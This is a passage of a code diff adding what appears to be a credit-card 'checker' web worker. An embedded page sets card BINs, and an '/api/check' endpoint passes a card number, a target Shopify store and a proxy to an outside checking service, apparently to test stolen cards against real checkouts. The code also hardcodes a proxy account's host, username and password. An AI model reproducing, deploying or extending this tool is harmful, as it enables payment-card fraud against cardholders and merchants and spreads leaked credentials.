+    window.setBIN=function(bin,type){
+        document.getElementById('binInput').value=bin;
+        showToast('BIN set: '+bin+' ('+type+')','info');
+    };
+    
+    function download(content,name,type){
+        var blob=new Blob([content],{type:type}),url=URL.createObjectURL(blob),a=document.createElement('a');
+        a.href=url;a.download=name;a.click();URL.revokeObjectURL(url);
+    }
+    
+    function showToast(msg,type){
+        type=type||'info';
+        var c=document.getElementById('toastContainer'),toast=document.createElement('div');
+        toast.className='toast '+type;
+        toast.innerHTML='<span>'+(type==='success'?'✅':type==='error'?'❌':'ℹ️')+'</span><span>'+msg+'</span>';
+        c.appendChild(toast);
+        setTimeout(function(){toast.style.animation='slideIn .3s ease reverse';setTimeout(function(){toast.remove()},300)},3000);
+    }
+})();
+</script>
+</body>
+</html>`;
+
+export default {
+    async fetch(request) {
+        const url = new URL(request.url);
+
+        // CORS headers
+        const corsHeaders = {
+            'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+            'Access-Control-Allow-Headers': '*'
+        };
+
+        // Handle preflight
+        if (request.method === 'OPTIONS') {
+            return new Response(null, { status: 204, headers: corsHeaders });
+        }
+
+        // API endpoint
+        if (url.pathname === '/api/check') {
+            try {
+                const site = url.searchParams.get('site') || 'https://artpop.com';
+                const cc = url.searchParams.get('cc');
+                const proxy = url.searchParams.get('proxy') || 'px014236.pointtoserver.com:10780:purevpn0s11127688:4mwmyaoa';
+
+                if (!cc) {
+                    return new Response(JSON.stringify({ error: 'Missing cc', Status: 'Error', Response: 'MISSING_CC' }), {
+                        status: 400,
+                        headers: { 'Content-Type': 'application/json', ...corsHeaders }
+                    });
+                }
+
+                console.log(`[Shopii] Checking: ${cc.substring(0, 8)}...`);
+
+                const shopiiUrl = `https://shopii-api-production.up.railway.app/shopify?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${encodeURIComponent(proxy)}`;
+                
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 35000);
+
+                const response = await fetch(shopiiUrl, {
+                    headers: { 'User-Agent': 'ShopiiPro/2.0' },
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeout);
+
+                const data = await response.json();
+                console.log(`[Shopii] Result: ${data.Status}`);
+
+                return new Response(JSON.stringify(data), {
+                    status: 200,
+                    headers: { 'Content-Type': 'application/json', ...corsHeaders }
+                });
+            } catch (error) {
+                console.error('[Shopii] Error:', error.message);
+                return new Response(JSON.stringify({
+                    error: true,
+                    message: error.message,
+                    Status: 'Error',
+                    Response: error.name === 'AbortError' ? 'TIMEOUT' : 'API_ERROR'
+                }), {
+                    status: 500,
+                    headers: { 'Content-Type': 'application/json', ...corsHeaders }
+                });
+            }
+        }
+
+        // Serve HTML
+        return new Response(HTML, {
+            status: 200,
+            headers: {
+                'Content-Type': 'text/html;charset=UTF-8',
+                ...corsHeaders
+            }
+        });
+    }
+};
